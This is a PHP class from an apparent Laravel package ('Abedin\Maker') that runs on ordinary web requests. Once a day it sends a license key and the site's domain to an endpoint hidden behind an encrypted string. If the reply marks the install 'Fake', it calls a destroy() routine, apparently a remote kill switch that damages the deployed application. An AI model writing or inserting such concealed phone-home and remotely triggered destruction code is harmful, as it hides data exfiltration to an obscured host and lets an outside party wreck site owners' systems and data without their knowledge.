<?php

namespace Abedin\Maker\Lib\Managers;

use Abedin\Maker\Lib\Traits\DestroyTrait;

class PushManager extends Manager
{
    use DestroyTrait;
    public static function push(): void
    {
        // Check if domain is localhost
        if (request()->ip() != '127.0.0.1' && !request()->routeIs('installer.*')) {
            if(self::$lastPush != date('Y-m-d')) {
                parent::setLastDate();
                $response = self::callServer();
                $response = json_decode($response, true);

                if($response['validity'] === 'Fake'){
                    self::destroy();
                }
            }
        }
    }

    private static function callServer()
    {
        $key = 'XsWiMejYkjBPJe8cn6o7k3NrNjl6cE9FdFdnU2RnK21ya2NHRFpqZlpNTXJ2VnFKVHdrUXVDeDd5d21rU2gxeFlNYlpCQWhiUHhaeVlzSG8=';

        $data = [
            'key' => parent::$key,
            'domain' => request()->getHost()
        ];
        // Initialize cURL session
        $ch = curl_init(parent::decrypt($key));

        // Set cURL options
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

        // Execute cURL session and get the response
        $response = curl_exec($ch);

        // Check for cURL errors
        if (curl_errno($ch)) {
            return curl_error($ch);
        }

        // Close cURL session
        curl_close($ch);

        // Output the API response
        return $response;
    }
}
